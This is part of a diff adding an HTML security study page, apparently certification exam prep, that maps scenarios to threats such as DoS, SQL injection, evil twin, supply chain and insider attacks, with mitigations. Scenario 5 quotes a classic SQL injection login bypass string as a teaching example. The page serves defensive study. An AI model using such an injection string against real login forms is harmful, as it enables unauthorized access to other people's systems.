+  <strong>Scenario 3:</strong> A website slows to a crawl because a single attacker is flooding it → DoS. If thousands of IPs are involved → DDoS.<br>
+  <strong>Scenario 4:</strong> A user's laptop was stolen; the drive contained SSNs. The disk was not encrypted → BYOD + unprotected systems vulnerability.<br>
+  <strong>Scenario 5:</strong> An attacker scans a login form by entering <code>' OR '1'='1' --</code> → SQL injection. Fix: parameterized queries.<br>
+  <strong>Scenario 6:</strong> A company is running Windows 7 on critical systems because an application won't run on newer OSes → EOL vulnerability. Isolate and plan replacement.<br>
+  <strong>Scenario 7:</strong> An attacker sets up a Wi-Fi AP named "Hotel_Guest_WiFi" in the lobby → Evil twin. Use VPN when on any untrusted network.<br>
+  <strong>Scenario 8:</strong> A trusted software update from a major vendor contains a backdoor installed by attackers who compromised the vendor → Supply chain attack.<br>
+  <strong>Scenario 9:</strong> An employee leaving the company downloads 10,000 files before their last day → Insider threat (malicious). Least privilege + activity monitoring + immediate deprovisioning.<br>
+  <strong>Scenario 10:</strong> A user's account was compromised even though they had a strong password, because an attacker replicated a public Wi-Fi hotspot → Evil twin / on-path attack. VPN would have prevented credential interception.</p>
+</div>
+
+</div><!-- /.page -->
+</body>
+</html>
